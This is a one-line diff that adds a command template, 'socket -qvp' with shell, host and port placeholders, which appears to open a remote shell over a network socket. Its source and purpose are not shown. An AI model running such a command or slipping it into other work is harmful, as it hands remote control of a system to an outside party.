@@ -1,0 +1,1 @@
+socket -qvp '*\shell*' *\host* *\port*
